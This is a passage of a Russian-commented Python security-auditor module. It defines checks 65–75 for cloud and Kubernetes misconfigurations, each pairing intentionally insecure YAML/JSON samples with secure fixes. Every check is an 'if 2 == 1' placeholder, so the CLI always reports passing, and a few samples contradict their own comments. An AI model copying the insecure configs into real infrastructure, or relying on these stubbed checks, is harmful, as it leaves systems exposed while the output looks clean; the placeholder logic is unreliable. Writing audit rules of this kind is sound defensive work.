  "python:3.8-slim": {
    "cves": [
      {"id": "CVE-2023-3817", "severity": "HIGH", "package": "openssl"},
      {"id": "CVE-2024-2961", "severity": "MEDIUM", "package": "glibc"}
    ]
  }
}""",
                secure="""# 1. Использовать актуальные, минимальные базовые образы:
FROM python:3.12-slim-bookworm  # ✅ Актуальная версия
# Или distroless для минимизации поверхности атаки:
FROM gcr.io/distroless/python3-debian12
# 2. Фиксировать версии и проверять уязвимости:
# requirements.txt
flask==3.0.0          # ✅ Актуальная версия
gunicorn==21.2.0
# 3. Сканирование образов в CI:
# .gitlab-ci.yml
scan-image:
  stage: test
  image: aquasec/trivy:latest
  script:
  - trivy image --exit-code 1 --severity CRITICAL,HIGH my-app:latest
# ✅ Блокировать деплой при критических уязвимостях""",
                remediation=[
                    "Обновите базовые образы до актуальных версий",
                    "Используйте distroless/minimal images",
                    "Внедрите сканирование образов в CI/CD",
                    "Настройте Dependabot для автоматических обновлений"
                ]
            )
        return None

@CheckRegistry.register
class Kubernetes_Supply_Chain_Attack_65(BaseCheck):
    """Проверка 65: Kubernetes Supply Chain Attack"""
    RULE_NAME = "Kubernetes Supply Chain Attack"
    STANDARD = "SLSA-3"
    SEVERITY = Severity.CRITICAL
    CHECK_ID = "kubernetes_supply_chain_attack_65"

    def check(self) -> SecurityReport:
        self.files_checked = ["3_Hard_test/03-15/01_image_deployment.yaml",
                              "3_Hard_test/03-15/02_admission_policy.yaml",
                              "3_Hard_test/03-15/03_signature_verification.yaml"]

        if 2 == 1:  # ⚠️ Замените на реальную проверку файла
            return self._create_report(
                issue="В кластер можно деплоить неподписанные/неверифицированные образы",
                risk="Supply-chain атака на кластер:\n"
                     "  • Компрометация CI/CD = деплой вредоносного образа\n"
                     "  • Подмена образа в реестре (man-in-the-middle)\n"
                     "  • Использование уязвимостей в 'легальных' образах\n"
                     "Без проверки подписей невозможно гарантировать целостность.",
                insecure="""# 01_image_deployment.yaml - Деплой без проверки подписи
apiVersion: apps/v1
kind: Deployment
metadata:
  name: vulnerable-app
spec:
  template:
    spec:
      containers:
      - name: app
        image: registry.company.com/app:v1.2.3
        # ❌ Нет проверки: кто подписал образ? не модифицирован ли он?
# 02_admission_policy.yaml - Отсутствует ValidatingAdmissionPolicy
# или политика не проверяет подписи:
validations:
- expression: "object.spec.template.spec.containers.all(c, c.image.startsWith('registry.company.com/'))"
# ❌ Проверяет только реестр, но не подпись/целостность образа
# 03_signature_verification.yaml - Cosign verification не настроен""",
                secure="""# 1. Включить проверку подписей через Sigstore/Cosign:
# ClusterImagePolicy (Sigstore policy-controller)
apiVersion: policy.sigstore.dev/v1beta1
kind: ClusterImagePolicy
metadata:
  name: signed-images-only
spec:
  images:
  - glob: "registry.company.com/**"
  authorities:
  - key:
      data: |
        -----BEGIN PUBLIC KEY-----
        MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE...
        -----END PUBLIC KEY-----
# 2. Admission webhook для валидации:
# - Установить policy-controller от Sigstore
# - Настроить failurePolicy: Fail
# 3. Подпись образов в CI:
# - cosign sign --key $COSIGN_PRIVATE_KEY registry.company.com/app:$CI_COMMIT_SHA""",
                remediation=[
                    "Внедрите Sigstore/Cosign для подписи образов",
                    "Настройте ValidatingAdmissionPolicy для проверки подписей",
                    "Подписывайте все образы в CI/CD пайплайне",
                    "Требуйте SBOM для каждого образа"
                ]
            )
        return None

# =============================================================================
# 🔹 CLOUD GOVERNANCE CHECKS (66-68)
# =============================================================================
@CheckRegistry.register
class Cloud_Resource_Tagging_Compliance_66(BaseCheck):
    """Проверка 66: Cloud Resource Tagging Compliance"""
    RULE_NAME = "Cloud Resource Tagging Compliance"
    STANDARD = "NIST-CM-2.1"
    SEVERITY = Severity.MEDIUM
    CHECK_ID = "cloud_resource_tagging_compliance_66"

    def check(self) -> SecurityReport:
        self.files_checked = ["3_Hard_test/03-16/01_resources.yaml",
                              "3_Hard_test/03-16/02_tagging_policy.yaml"]

        if 2 == 1:  # ⚠️ Замените на реальную проверку файла
            return self._create_report(
                issue="Ресурсы созданы без обязательных тегов (owner, cost-center, env)",
                risk="Отсутствие тегов = потеря контроля над инфраструктурой:\n"
                     "  • Невозможно определить владельца для инцидента\n"
                     "  • Сложность распределения затрат (cost allocation)\n"
                     "  • Нарушение требований комплаенса (SOC2, ISO27001)\n"
                     "  • Риск 'забытых' ресурсов (orphaned resources)",
                insecure="""# 01_resources.yaml - Ресурсы без обязательных тегов
Type: AWS::EC2::Instance
Properties:
  InstanceType: t3.medium
  ImageId: ami-12345678
  # Tags отсутствуют или неполные:
  Tags:
  - Key: Name
    Value: web-server
  # ❌ Нет: owner, cost-center, environment
Type: AWS::S3::Bucket
Properties:
  BucketName: company-data-bucket
  # ❌ Tags полностью отсутствуют
# 02_tagging_policy.yaml - Политика требует теги:
RequiredTags:
- owner
- cost-center
- environment
- project
# Но ресурсы не соответствуют политике""",
                secure="""# 1. Обязательные теги на всех ресурсах:
Type: AWS::EC2::Instance
Properties:
  InstanceType: t3.medium
  Tags:
  - Key: Name
    Value: web-server
  - Key: owner
    Value: team-platform@company.com
  - Key: cost-center
    Value: CC-12345
  - Key: environment
    Value: production
  - Key: project
    Value: main-app
# 2. Принудительное применение через AWS Config:
Type: AWS::Config::ConfigRule
Properties:
  ConfigRuleName: required-tags
  Source:
    Owner: AWS
    SourceIdentifier: REQUIRED_TAGS
# 3. Tag Policy через AWS Organizations""",
                remediation=[
                    "Добавьте обязательные теги ко всем ресурсам",
                    "Включите AWS Config rule для мониторинга",
                    "Используйте Tag Policy через Organizations",
                    "Настройте pre-commit hooks для валидации"
                ]
            )
        return None

@CheckRegistry.register
class Encryption_Key_Cross_Account_Access_67(BaseCheck):
    """Проверка 67: Encryption Key Cross-Account Access"""
    RULE_NAME = "Encryption Key Cross-Account Access"
    STANDARD = "CIS-AWS-2.1.6"
    SEVERITY = Severity.HIGH
    CHECK_ID = "encryption_key_cross_account_access_67"

    def check(self) -> SecurityReport:
        self.files_checked = ["3_Hard_test/03-17/01_kms_key.yaml",
                              "3_Hard_test/03-17/02_key_policy.yaml"]

        if 2 == 1:  # ⚠️ Замените на реальную проверку файла
            return self._create_report(
                issue="KMS ключ доступен другому AWS аккаунту без условий безопасности",
                risk="Кросс-аккаунт доступ без ограничений:\n"
                     "  • Любой пользователь из аккаунта 222222222222 может расшифровывать данные\n"
                     "  • При компрометации второго аккаунта = утечка данных\n"
                     "  • Невозможно отследить, кто именно использовал ключ\n"
                     "  • Нарушение принципа наименьших привилегий",
                insecure="""# 01_kms_key.yaml - KMS ключ с кросс-аккаунт доступом
Type: AWS::KMS::Key
Properties:
  KeyPolicy:
    Statement:
    - Sid: Enable IAM User Permissions
      Effect: Allow
      Principal:
        AWS: "arn:aws:iam::111111111111:root"
      Action: "kms:*"
    - Sid: Allow Cross-Account Access
      Effect: Allow
      Principal:
        AWS: "arn:aws:iam::222222222222:root"  # ❌ Другой аккаунт!
      Action:
      - "kms:Decrypt"
      - "kms:Encrypt"
      - "kms:GenerateDataKey"
      Resource: "*"
      # ❌ Нет Condition для ограничения!""",
                secure="""# 1. Ограничить доступ конкретными ролями, не root аккаунта:
Statement:
  Sid: Allow Cross-Account Access
  Effect: Allow
  Principal:
    AWS: "arn:aws:iam::222222222222:role/TrustedAppRole"  # ✅ Конкретная роль
  Action:
  - "kms:Decrypt"
  - "kms:GenerateDataKey"
  Resource: "*"
# 2. Добавить условия для дополнительной защиты:
Condition:
  StringEquals:
    "kms:ViaService": "s3.us-east-1.amazonaws.com"  # ✅ Только через S3
  Bool:
    "aws:SecureTransport": "true"  # ✅ Только HTTPS
# 3. Включить логирование использования ключа через CloudTrail""",
                remediation=[
                    "Замените root аккаунта на конкретные IAM роли",
                    "Добавьте Condition для ограничения использования",
                    "Включите CloudTrail для KMS событий",
                    "Регулярно аудируйте кросс-аккаунт доступы"
                ]
            )
        return None

@CheckRegistry.register
class VPC_Peering_Security_Gap_68(BaseCheck):
    """Проверка 68: VPC Peering Security Gap"""
    RULE_NAME = "VPC Peering Security Gap"
    STANDARD = "CIS-AWS-5.7"
    SEVERITY = Severity.HIGH
    CHECK_ID = "vpc_peering_security_gap_68"

    def check(self) -> SecurityReport:
        self.files_checked = ["3_Hard_test/03-18/01_vpc_a.yaml",
                              "3_Hard_test/03-18/02_vpc_b.yaml",
                              "3_Hard_test/03-18/03_peering_connection.yaml",
                              "3_Hard_test/03-18/04_route_tables.yaml"]

        if 2 == 1:  # ⚠️ Замените на реальную проверку файла
            return self._create_report(
                issue="VPC peering + route table + security group позволяют доступ из dev к prod",
                risk="VPC Peering security gap:\n"
                     "  • Разработчики из dev VPC могут подключиться к prod БД\n"
                     "  • Горизонтальное перемещение между окружениями\n"
                     "  • Утечка производственных данных в dev среду\n"
                     "  • Нарушение сегментации production/isolation",
                insecure="""# 01_vpc_a.yaml - Production VPC (10.0.0.0/16)
# 02_vpc_b.yaml - Development VPC (10.1.0.0/16)
# 03_peering_connection.yaml - Peering между prod и dev
# 04_route_tables.yaml - Маршруты разрешают весь трафик
Routes:
- DestinationCidrBlock: 10.1.0.0/16  # ✅ Весь dev VPC
  VpcPeeringConnectionId: !Ref Peering
# Security Group в prod разрешает доступ из dev:
SecurityGroupIngress:
- IpProtocol: tcp
  FromPort: 5432
  ToPort: 5432
  CidrIp: 10.1.0.0/16  # ❌ Весь dev VPC имеет доступ к prod DB!""",
                secure="""# 1. Ограничить маршруты конкретными подсетями:
Routes:
- DestinationCidrBlock: 10.1.1.0/24  # ✅ Только конкретная подсеть dev
  VpcPeeringConnectionId: !Ref Peering
# 2. Security Group с минимальными правами:
SecurityGroupIngress:
- IpProtocol: tcp
  FromPort: 5432
  ToPort: 5432
  SourceSecurityGroupId: !Ref DevAppSecurityGroup  # ✅ Только конкретный SG
# ❌ Не использовать CidrIp для peering!
# 3. Network ACL для дополнительного контроля:
RuleNumber: 100
CidrBlock: 10.1.1.0/24  # ✅ Только разрешённая подсеть
RuleAction: allow
RuleNumber: 200
CidrBlock: 0.0.0.0/0
RuleAction: deny  # ✅ Deny by default""",
                remediation=[
                    "Ограничьте route tables до конкретных подсетей",
                    "Используйте SourceSecurityGroupId вместо CidrIp",
                    "Настройте Network ACL для дополнительного контроля",
                    "Используйте Transit Gateway с инспекцией трафика"
                ]
            )
        return None

# =============================================================================
# 🔹 IDENTITY & ACCESS CHECKS (69-70)
# =============================================================================
@CheckRegistry.register
class Azure_AAD_Privileged_Identity_69(BaseCheck):
    """Проверка 69: Azure AAD Privileged Identity"""
    RULE_NAME = "Azure AAD Privileged Identity"
    STANDARD = "CIS-Azure-1.1"
    SEVERITY = Severity.CRITICAL
    CHECK_ID = "azure_aad_privileged_identity_69"

    def check(self) -> SecurityReport:
        self.files_checked = ["3_Hard_test/03-19/01_azure_user.yaml",
                              "3_Hard_test/03-19/02_pim_policy.yaml"]

        if 2 == 1:  # ⚠️ Замените на реальную проверку файла
            return self._create_report(
                issue="Привилегированные роли Azure AD назначены без PIM контроля активации",
                risk="Privileged Identity без контроля:\n"
                     "  • Постоянный доступ = большая поверхность атаки\n"
                     "  • Компрометация учётки = полный доступ к tenant\n"
                     "  • Отсутствие аудита активаций привилегий\n"
                     "  • Нарушение принципа Just-In-Time доступа",
                insecure="""# 01_azure_user.yaml - Пользователь с постоянной привилегированной ролью
Type: Microsoft.Authorization/roleAssignments
Properties:
  principalId: "user-id-12345"
  roleDefinitionId: "Global Administrator"  # ❌ Highest privilege!
# Роль назначена постоянно, не через PIM
# 02_pim_policy.yaml - PIM настройки без approval
{
  "roleSettings": {
    "requireApproval": false,  # ❌ Не требуется одобрение
    "maxActivationDuration": "PT8H",
    "requireMfa": false,  # ❌ MFA не требуется
    "requireJustification": false  # ❌ Не требуется обоснование
  }
}""",
                secure="""# 1. Использовать PIM для всех привилегированных ролей:
{
  "roleSettings": {
    "requireApproval": true,  # ✅ Требуется одобрение
    "approvers": [
      "admin1@company.com",
      "admin2@company.com"
    ],
    "maxActivationDuration": "PT4H",  # ✅ Максимум 4 часа
    "requireMfa": true,  # ✅ MFA обязательно
    "requireJustification": true,  # ✅ Требуется обоснование
    "requireTicketInfo": true  # ✅ Ссылка на тикет
  }
}
# 2. Назначить роль как "Eligible", не "Active":
condition: "PIM"  # ✅ Только через PIM
# 3. Включить аудит и алерты на активацию критических ролей""",
                remediation=[
                    "Включите PIM для всех привилегированных ролей",
                    "Требуйте MFA и approval для активации",
                    "Ограничьте длительность сессии до 4 часов",
                    "Настройте аудит активаций привилегий"
                ]
            )
        return None

@CheckRegistry.register
class GCP_Service_Account_Key_Leakage_70(BaseCheck):
    """Проверка 70: GCP Service Account Key Leakage"""
    RULE_NAME = "GCP Service Account Key Leakage"
    STANDARD = "CIS-GCP-1.1.5"
    SEVERITY = Severity.CRITICAL
    CHECK_ID = "gcp_service_account_key_leakage_70"

    def check(self) -> SecurityReport:
        self.files_checked = ["3_Hard_test/03-20/01_service_account.yaml",
                              "3_Hard_test/03-20/02_sa_key.yaml",
                              "3_Hard_test/03-20/03_key_rotation_policy.yaml"]

        if 2 == 1:  # ⚠️ Замените на реальную проверку файла
            return self._create_report(
                issue="Ключи сервисных аккаунтов GCP не ротируются или могут быть в repo",
                risk="Service Account Key leakage:\n"
                     "  • Ключи в git = публичная утечка (GitHub сканирование)\n"
                     "  • Долгая жизнь ключа = больший ущерб при компрометации\n"
                     "  • Сложность отзыва: нужно найти все места использования\n"
                     "  • Нарушение compliance требований",
                insecure="""# 01_service_account.yaml - Сервисный аккаунт
Type: google_service_account
Properties:
  account_id: "app-service-account"
# Ключи управляются вручную
# 02_sa_key.yaml - Ключ без ротации
Type: google_service_account_key
Properties:
  service_account_id: google_service_account.app.id
  public_key_type: "TYPE_X509_PEM_FILE"
# ❌ Нет политики ротации
# ❌ Ключ может храниться годами
# ❌ Может быть закоммичен в git
# 03_key_rotation_policy.yaml - Отсутствует или не enforced
{
  "keyRotationPolicy": {
    "enabled": false,  # ❌ Ротация отключена
    "maxKeyLifetime": null  # ❌ Нет ограничения времени жизни
  }
}""",
                secure="""# 1. Использовать Workload Identity вместо ключей:
# Для GKE:
apiVersion: v1
kind: ServiceAccount
metadata:
  annotations:
    iam.gke.io/gcp-service-account: app-sa@project.iam.gserviceaccount.com
# ✅ Без ключей, аутентификация через metadata server
# 2. Если ключи необходимы - автоматическая ротация:
{
  "keyRotationPolicy": {
    "enabled": true,  # ✅ Включена
    "maxKeyLifetime": "7776000s",  # ✅ 90 дней
    "rotationPeriod": "2592000s"  # ✅ Ротация каждые 30 дней
  }
}
# 3. Хранение ключей в Secret Manager
# 4. Мониторинг и алерты на создание ключей""",
                remediation=[
                    "Используйте Workload Identity вместо ключей",
                    "Включите автоматическую ротацию ключей",
                    "Храните ключи в Secret Manager",
                    "Сканируйте git repos на паттерны ключей"
                ]
            )
        return None

# =============================================================================
# 🔹 ADVANCED KUBERNETES CHECKS (71-72)
# =============================================================================
@CheckRegistry.register
class Kubernetes_Audit_Log_Tampering_71(BaseCheck):
    """Проверка 71: Kubernetes Audit Log Tampering"""
    RULE_NAME = "Kubernetes Audit Log Tampering"
    STANDARD = "CIS-K8S-3.2.1"
    SEVERITY = Severity.HIGH
    CHECK_ID = "kubernetes_audit_log_tampering_71"

    def check(self) -> SecurityReport:
        self.files_checked = ["3_Hard_test/03-21/01_apiserver_config.yaml",
                              "3_Hard_test/03-21/02_host_volume.yaml"]

        if 2 == 1:  # ⚠️ Замените на реальную проверку файла
            return self._create_report(
                issue="Путь к audit log доступен для записи контейнерами на хосте",
                risk="Audit log tampering:\n"
                     "  • Злоумышленник удаляет логи после атаки\n"
                     "  • Невозможно расследовать инцидент\n"
                     "  • Нарушение требований аудита (SOC2, PCI-DSS)\n"
                     "  • Скрытие несанкционированных действий",
                insecure="""# 01_apiserver_config.yaml - Конфигурация API Server
apiVersion: v1
kind: Pod
metadata:
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - name: kube-apiserver
    command:
    - kube-apiserver
    - --audit-log-path=/var/log/kubernetes/audit.log
    volumeMounts:
    - name: audit-logs
      mountPath: /var/log/kubernetes
# 02_host_volume.yaml - Volume с опасными permissions
volumes:
- name: audit-logs
  hostPath:
    path: /var/log/kubernetes
    type: DirectoryOrCreate
# ❌ На хосте директория имеет permissions 777
# ❌ Любой под может записать/удалить логи
# ❌ Нет отдельного пользователя для логов""",
                secure="""# 1. Защитить путь к логам на уровне хоста:
# /var/log/kubernetes должен принадлежать root:root
# Permissions: 750 или строже
# chown root:root /var/log/kubernetes
# chmod 750 /var/log/kubernetes
# 2. Использовать отдельный volume для логов:
volumes:
- name: audit-logs
  hostPath:
    path: /var/log/kubernetes/audit
    type: DirectoryOrCreate
# Смонтировать как read-only для всех кроме API server:
volumeMounts:
- name: audit-logs
  mountPath: /var/log/kubernetes
  readOnly: false  # Только для API server
# 3. Отправить логи в удалённое хранилище (SIEM)
# 4. Pod Security Policy / Admission Controller для запрета hostPath""",
                remediation=[
                    "Ограничьте permissions на хосте для audit-директорий",
                    "Отправьте логи в удалённое SIEM хранилище",
                    "Запретите монтирование hostPath через admission controller",
                    "Включите integrity monitoring для audit.log"
                ]
            )
        return None

@CheckRegistry.register
class Container_Registry_Public_Push_72(BaseCheck):
    """Проверка 72: Container Registry Public Push"""
    RULE_NAME = "Container Registry Public Push"
    STANDARD = "CIS-Docker-4.3"
    SEVERITY = Severity.CRITICAL
    CHECK_ID = "container_registry_public_push_72"

    def check(self) -> SecurityReport:
        self.files_checked = ["3_Hard_test/03-22/01_registry_config.yaml",
                              "3_Hard_test/03-22/02_access_policy.yaml"]

        if 2 == 1:  # ⚠️ Замените на реальную проверку файла
            return self._create_report(
                issue="Registry позволяет загружать образы без аутентификации",
                risk="Public push к registry:\n"
                     "  • Злоумышленник загружает вредоносный образ\n"
                     "  • Подмена легитимных образов (tag hijacking)\n"
                     "  • Supply chain атака на все деплои\n"
                     "  • Запуск малвари в production",
                insecure="""# 01_registry_config.yaml - Конфигурация Registry
Type: Registry
Properties:
  host: registry.company.com
  port: 5000
  authentication:
    enabled: false  # ❌ Аутентификация отключена!
  authorization:
    anonymous_push: true  # ❌ Анонимный push разрешён!
# 02_access_policy.yaml - Политика доступа
{
  "repositories": {
    "*": {
      "pull": "anonymous",  # ✅ OK для публичных образов
      "push": "anonymous"   # ❌ Опасно! Любой может запушить
    }
  }
}""",
                secure="""# 1. Требовать аутентификацию для всех операций:
authentication:
  enabled: true
  type: htpasswd  # или token, oauth2
  # Для production использовать OIDC/SSO
authorization:
  anonymous_push: false  # ✅ Запретить анонимный push
  anonymous_pull: false  # ✅ Или ограничить публичные репозитории
# 2. Role-based access control:
{
  "repositories": {
    "production/": {
      "pull": "service-account",
      "push": "ci-cd-pipeline"  # ✅ Только CI/CD
    }
  }
}
# 3. Подпись образов (cosign/notary)
# 4. Сканирование образов перед accept""",
                remediation=[
                    "Включите аутентификацию для всех операций",
                    "Запретите anonymous_push",
                    "Внедрите RBAC для registry",
                    "Требуйте подпись образов перед accept"
                ]
            )
        return None

# =============================================================================
# 🔹 SERVERLESS & MULTI-CLOUD CHECKS (73-75)
# =============================================================================
@CheckRegistry.register
class Serverless_Function_Chain_Exploit_73(BaseCheck):
    """Проверка 73: Serverless Function Chain Exploit"""
    RULE_NAME = "Serverless Function Chain Exploit"
    STANDARD = "NIST-AC-4"
    SEVERITY = Severity.CRITICAL
    CHECK_ID = "serverless_function_chain_exploit_73"

    def check(self) -> SecurityReport:
        self.files_checked = ["3_Hard_test/03-23/01_api_gateway.yaml",
                              "3_Hard_test/03-23/02_lambda_function.yaml",
                              "3_Hard_test/03-23/03_dynamodb_table.yaml",
                              "3_Hard_test/03-23/04_sns_topic.yaml"]

        if 2 == 1:  # ⚠️ Замените на реальную проверку файла
            return self._create_report(
                issue="Цепочка serverless ресурсов позволяет эскалацию привилегий (API → Lambda → DB → SNS)",
                risk="Serverless chain exploit:\n"
                     "  • Один уязвимый endpoint = доступ ко всей цепочке\n"
                     "  • Чтение всех данных из DynamoDB\n"
                     "  • Рассылка фишинга через SNS\n"
                     "  • Эскалация через Lambda к другим сервисам",
                insecure="""# 01_api_gateway.yaml - Публичный API Gateway
Type: AWS::ApiGateway::RestApi
Properties:
  Name: public-api
# ❌ Нет авторизации на уровне API
# 02_lambda_function.yaml - Lambda с избыточными правами
Type: AWS::Lambda::Function
Properties:
  FunctionName: process-data
  Role: arn:aws:iam::123456789012:role/Lambda-Role
# Lambda-Role policy:
Effect: Allow
Action:
- "dynamodb:*"  # ❌ Все действия над DynamoDB
- "sns:*"       # ❌ Все действия над SNS
- "s3:*"        # ❌ Все действия над S3
Resource: "*"     # ❌ Все ресурсы!
# 03_dynamodb_table.yaml - Таблица с чувствительными данными
# ❌ Нет encryption at rest
# ❌ Нет point-in-time recovery
# 04_sns_topic.yaml - Topic для уведомлений
# ❌ Policy позволяет publish от любого""",
                secure="""# 1. Авторизация на уровне API Gateway:
Type: AWS::ApiGateway::Method
Properties:
  AuthorizationType: AWS_IAM  # ✅ Или COGNITO_USER_POOLS
  AuthorizerId: !Ref LambdaAuthorizer
# 2. Принцип наименьших привилегий для Lambda:
Effect: Allow
Action:
- "dynamodb:GetItem"
- "dynamodb:PutItem"
Resource:
- "arn:aws:dynamodb:region:account:table/user-data"
# ❌ Нет "*", только конкретные действия и ресурсы
# 3. Шифрование и защита данных:
Type: AWS::DynamoDB::Table
Properties:
  SSESpecification:
    SSEEnabled: true  # ✅ Шифрование включено
  PointInTimeRecoverySpecification:
    PointInTimeRecoveryEnabled: true  # ✅ Recovery включён
# 4. Resource-based policies для SNS с ограничением источника""",
                remediation=[
                    "Включите авторизацию на API Gateway",
                    "Ограничьте IAM права Lambda до конкретных действий",
                    "Включите шифрование для DynamoDB",
                    "Настройте Resource-based policies для SNS"
                ]
            )
        return None

@CheckRegistry.register
class Multi_Cloud_Identity_Federation_74(BaseCheck):
    """Проверка 74: Multi-Cloud Identity Federation"""
    RULE_NAME = "Multi-Cloud Identity Federation"
    STANDARD = "NIST-IA-3"
    SEVERITY = Severity.HIGH
    CHECK_ID = "multi_cloud_identity_federation_74"

    def check(self) -> SecurityReport:
        self.files_checked = ["3_Hard_test/03-24/01_aws_trust_policy.yaml",
                              "3_Hard_test/03-24/02_azure_trust_policy.yaml",
                              "3_Hard_test/03-24/03_federation_policy.yaml"]

        if 2 == 1:  # ⚠️ Замените на реальную проверку файла
            return self._create_report(
                issue="Federation trust между облаками без MFA и ограничений",
                risk="Multi-cloud federation без MFA:\n"
                     "  • Компрометация Azure AD = доступ к AWS\n"
                     "  • Компрометация AWS = доступ к Azure\n"
                     "  • Без MFA = легче украсть сессию\n"
                     "  • Долгая сессия = больше времени для атаки",
                insecure="""# 01_aws_trust_policy.yaml - AWS trust для Azure AD
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "Federated": "arn:aws:iam::123456789012:saml-provider/AzureAD"
    },
    "Action": "sts:AssumeRoleWithSAML",
    "Condition": {
      "StringEquals": {
        "SAML:aud": "https://signin.aws.amazon.com/saml"
      }
      # ❌ Нет условия на MFA!
      # ❌ Нет ограничения по IP
    }
  }]
}
# 02_azure_trust_policy.yaml - Azure trust для AWS
{
  "federationPolicy": {
    "trustedIdentityProviders": ["arn:aws:iam::123456789012:saml-provider/AWS"],
    "requireMfa": false,  # ❌ MFA не требуется
    "sessionDuration": "PT12H"  # ❌ 12 часов - слишком долго
  }
}""",
                secure="""# 1. Требовать MFA для federation:
"Condition": {
  "StringEquals": {
    "SAML:aud": "https://signin.aws.amazon.com/saml",
    "SAML:authnContextClassRef": "urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport"
  },
  "IpAddress": {
    "aws:SourceIp": ["10.0.0.0/8", "192.168.1.0/24"]  # ✅ Только доверенные IP
  }
}
# 2. Ограничить длительность сессии:
{
  "federationPolicy": {
    "requireMfa": true,  # ✅ MFA обязательно
    "sessionDuration": "PT1H",  # ✅ Максимум 1 час
    "deviceCompliance": true  # ✅ Проверка устройства
  }
}
# 3. Использовать Conditional Access (Azure AD)
# 4. Мониторинг federation активности""",
                remediation=[
                    "Требуйте MFA для всех federation trust",
                    "Ограничьте длительность сессии до 1 часа",
                    "Добавьте IP restrictions к trust policy",
                    "Мониторьте federation события через CloudTrail"
                ]
            )
        return None

@CheckRegistry.register
class Drift_Detection_from_Baseline_75(BaseCheck):
    """Проверка 75: Drift Detection from Baseline"""
    RULE_NAME = "Drift Detection from Baseline"
    STANDARD = "NIST-CM-3.2"
    SEVERITY = Severity.HIGH
    CHECK_ID = "drift_detection_from_baseline_75"

    def check(self) -> SecurityReport:
        self.files_checked = ["3_Hard_test/03-25/01_terraform_state.json",
                              "3_Hard_test/03-25/02_live_scan.json",
                              "3_Hard_test/03-25/03a_drift_detected.json"]

        if 2 == 1:  # ⚠️ Замените на реальную проверку файла
            return self._create_report(
                issue="Текущее состояние инфраструктуры отличается от Terraform state",
                risk="Configuration drift:\n"
                     "  • Несоответствие security baseline\n"
                     "  • 'Ручные' изменения обходят code review\n"
                     "  • Сложность аудита и комплаенса\n"
                     "  • Риск нестабильности при re-deploy",
                insecure="""# 01_terraform_state.json - Ожидаемое состояние
{
  "resources": [{
    "type": "aws_security_group",
    "name": "prod-sg",
    "values": {
      "ingress": [{
        "from_port": 443,
        "to_port": 443,
        "cidr_blocks": ["10.0.0.0/8"]  # ✅ Только internal
      }]
    }
  }]
}
# 02_live_scan.json - Фактическое состояние из AWS API
{
  "resources": [{
    "type": "aws_security_group",
    "name": "prod-sg",
    "values": {
      "ingress": [{
        "from_port": 443,
        "to_port": 443,
        "cidr_blocks": ["0.0.0.0/0"]  # ❌ Изменено на публичный!
      }, {
        "from_port": 22,
        "to_port": 22,
        "cidr_blocks": ["0.0.0.0/0"]  # ❌ SSH открыт!
      }]
    }
  }]
}""",
                secure="""# 1. Регулярный drift detection:
# terraform plan -out=tfplan (сравнение state с config)
# AWS Config rules для continuous monitoring
# CloudFormation Drift Detection
# 2. Автоматическое исправление или алерт:
{
  "driftPolicy": {
    "action": "alert",  # ✅ Алерт при drift
    "severity": "high",
    "notify": ["security-team@company.com"],
    "autoRemediate": false  # ✅ Требовать review перед исправлением
  }
}
# 3. Запретить ручные изменения:
# - IAM policies deny manual changes to critical resources
# - Require all changes through Terraform/CI/CD
# 4. Version control для state с locking""",
                remediation=[
                    "Настройте регулярный drift detection",
                    "Включите AWS Config для continuous monitoring",
                    "Запретите ручные изменения через IAM policies",
                    "Интегрируйте drift check в CI/CD pipeline"
                ]
            )
        return None

# =============================================================================
# 🔹 CLI ЗАПУСК
# =============================================================================
if __name__ == "__main__":
    import sys
    print("🔐 Security Auditor — Hard Level Checks\n")

    if len(sys.argv) > 1:
        if sys.argv[1] == "--list":
            print("📋 Доступные проверки Hard уровня:\n")
            for check_name, check_class in CheckRegistry.get_checks_by_level('hard').items():
                print(f"  {check_class.CHECK_ID:40} [{check_class.SEVERITY.value}]")
        else:
            check_name = sys.argv[1]
            check_class = CheckRegistry.get_check(check_name)
            if check_class:
                check = check_class()
                report = check.check()
                if report:  # ✅ Выводим только если найдена уязвимость
                    report.print_report()
                else:
                    print(f"✅ Проверка '{check_name}' пройдена — уязвимостей не найдено")
            else:
                print(f"❌ Проверка '{check_name}' не найдена!")
    else:
        reports = []
        for check_class in CheckRegistry.get_checks_by_level('hard'):
            check = check_class()
            report = check.check()
            if report:  # ✅ Собираем только отчёты с уязвимостями
                reports.append(report)
                report.print_report()

        if reports:
            CheckRegistry.print_summary(reports)
        else:
            print("\n✅ Все проверки Hard уровня пройдены — уязвимостей не найдено!\n")